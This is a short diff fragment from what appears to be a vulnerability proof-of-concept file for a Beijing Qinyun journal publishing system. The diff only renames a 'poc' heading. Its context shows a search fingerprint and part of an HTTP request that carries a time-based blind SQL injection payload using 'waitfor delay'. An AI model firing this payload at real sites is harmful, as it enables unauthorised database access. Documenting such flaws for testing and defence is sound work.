@@ -7,7 +7,7 @@
 body="北京勤云科技"
 ```
 
-## poc
+## POC
 ```javascript
 GET /burpsuite'if%20db_name(1)='master'%20waitfor%20delay%20'0:0:5'--/article/abstract/1 HTTP/1.1
 Host: 
